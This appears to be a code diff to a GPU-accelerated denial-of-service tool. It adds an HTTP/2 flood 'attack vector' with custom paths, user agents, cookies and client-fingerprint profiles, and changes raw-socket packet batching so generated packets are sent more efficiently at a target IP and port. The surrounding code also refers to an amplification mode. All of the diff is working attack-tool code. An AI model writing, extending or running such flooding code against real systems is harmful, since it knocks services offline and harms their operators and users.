@@ -753,7 +753,10 @@ async def worker_process(
 
                 BATCH_SIZE = int(os.environ.get("SAMURAI_GPU_BATCH", 100000))
                 remaining = args['count']
-                payload_engine = gpu_payload.GPUPayloadEngine(BATCH_SIZE)
+                payload_engine = gpu_payload.GPUPayloadEngine(
+                    BATCH_SIZE,
+                    rng_seed=args.get("gpu_rng_seed", 1234),
+                )
 
                 # Load custom wordlists once per worker/engine.
                 if args.get('http_path') and isinstance(args['http_path'], list):
@@ -787,6 +790,8 @@ async def worker_process(
                         ttls=ttls
                     )
                     active_gpu = packets_gpu_array[: batch_count * packet_size]
+                    lengths_cpu = cp.asnumpy(payload_engine.packet_lengths[:batch_count])
+                    valid_slots = [i for i, plen in enumerate(lengths_cpu) if int(plen) > 0]
 
                     current_batch = {
                         "cpu": _gpu_to_host(
@@ -796,6 +801,8 @@ async def worker_process(
                             blocking=False,
                         ),
                         "count": batch_count,
+                        "packet_size": int(packet_size),
+                        "valid_slots": valid_slots,
                         "stream": stream_ring[stream_idx],
                         "slot": stream_idx,
                         "ready_event": cp.cuda.Event(),
@@ -808,11 +815,25 @@ async def worker_process(
                     if len(ready_queue) >= 2:
                         send_batch = ready_queue.pop(0)
                         await _await_cuda_event(send_batch["ready_event"])
+                        send_buf = send_batch["cpu"]
+                        send_count = int(send_batch["count"])
+                        valid_slots_send = send_batch.get("valid_slots") or []
+                        if len(valid_slots_send) < send_count:
+                            packet_size_send = int(send_batch.get("packet_size", 0) or 0)
+                            compact = bytearray()
+                            if packet_size_send > 0:
+                                for slot_idx in valid_slots_send:
+                                    start = int(slot_idx) * packet_size_send
+                                    compact.extend(send_buf[start:start + packet_size_send])
+                            send_buf = bytes(compact)
+                            send_count = len(valid_slots_send)
+                        if send_count <= 0:
+                            continue
                         worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
-                            packets_buffer=send_batch["cpu"],
+                            packets_buffer=send_buf,
                             target_ip=args['target'],
                             target_port=args['port'],
-                            count=send_batch["count"],
+                            count=send_count,
                             verbose=args['verbose'],
                             pacing_config=pacing_cfg,
                             live_sent=sent_total,
@@ -825,17 +846,83 @@ async def worker_process(
                 while ready_queue:
                     send_batch = ready_queue.pop(0)
                     await _await_cuda_event(send_batch["ready_event"])
+                    send_buf = send_batch["cpu"]
+                    send_count = int(send_batch["count"])
+                    valid_slots_send = send_batch.get("valid_slots") or []
+                    if len(valid_slots_send) < send_count:
+                        packet_size_send = int(send_batch.get("packet_size", 0) or 0)
+                        compact = bytearray()
+                        if packet_size_send > 0:
+                            for slot_idx in valid_slots_send:
+                                start = int(slot_idx) * packet_size_send
+                                compact.extend(send_buf[start:start + packet_size_send])
+                        send_buf = bytes(compact)
+                        send_count = len(valid_slots_send)
+                    if send_count <= 0:
+                        continue
                     worker_stats = _add_stats(worker_stats, await senders.paced_raw_socket_sender(
-                        packets_buffer=send_batch["cpu"],
+                        packets_buffer=send_buf,
                         target_ip=args['target'],
                         target_port=args['port'],
-                        count=send_batch["count"],
+                        count=send_count,
                         verbose=args['verbose'],
                         pacing_config=pacing_cfg,
                         live_sent=sent_total,
                         live_errors=errors_total,
                         live_progress=progress
                     ))
+                return
+
+            if args['attack_vector'] == 'http2':
+                log_info("Initializing GPU HTTP/2 planner (hybrid GPU plan + CPU transport)...")
+                BATCH_SIZE = int(os.environ.get("SAMURAI_GPU_BATCH", 100000))
+                remaining = int(args['count'])
+                payload_engine = gpu_payload.GPUPayloadEngine(
+                    BATCH_SIZE,
+                    rng_seed=args.get("gpu_rng_seed", 1234),
+                )
+
+                custom_methods = [str(args.get("http_method", "GET") or "GET").upper()]
+                custom_paths = args.get("http_path")
+                custom_uas = None
+                if args.get("user_agent"):
+                    custom_uas = [str(args["user_agent"])]
+                payload_engine.load_custom_wordlists(
+                    methods=custom_methods,
+                    paths=custom_paths if isinstance(custom_paths, list) and custom_paths else ["/"],
+                    uas=custom_uas,
+                )
+
+                while remaining > 0:
+                    batch_count = min(remaining, BATCH_SIZE)
+                    payload_engine.count = batch_count
+                    request_plan = payload_engine.generate_h2_request_plan(
+                        target_ip=args['target'],
+                        count=batch_count,
+                        current_time=int(time.time() * 1000),
+                    )
+                    plan_count = len(request_plan.items)
+                    if plan_count > 0:
+                        worker_stats = _add_stats(worker_stats, await senders.http2_sender(
+                            target_ip=args['target'],
+                            target_port=args['port'],
+                            count=plan_count,
+                            concurrency=args['http2_concurrency'],
+                            http_path=args['http_path'],
+                            http_method=args['http_method'],
+                            verbose=args['verbose'],
+                            scheme=args['http_scheme'],
+                            cookies=args.get('cookies'),
+                            user_agent=args.get('user_agent'),
+                            ssl_context=ssl_context,
+                            h2_profile_name=args.get("h2_profile", args.get("ja3_profile", "none")),
+                            request_plan=request_plan,
+                            live_sent=sent_total,
+                            live_errors=errors_total,
+                            live_progress=progress,
+                        ))
+                    remaining -= batch_count
+                    await asyncio.sleep(0)
                 return
 
             # --- AMPLIFICATION MODE (GPU) ---
@@ -1315,7 +1402,7 @@ async def worker_process(
             # Hybrid Mode: Create template POOL on CPU, replicate on GPU
             
             # Determine Pool Size
-            if args['attack_vector'] in ["http", "http2"]:
+            if args['attack_vector'] == "http":
                 TEMPLATE_POOL_SIZE = max(1, int(args.get("gpu_template_pool_size_l7", 50) or 50))
             else:
                 TEMPLATE_POOL_SIZE = max(1, int(args.get("gpu_template_pool_size_l4", 10) or 10))
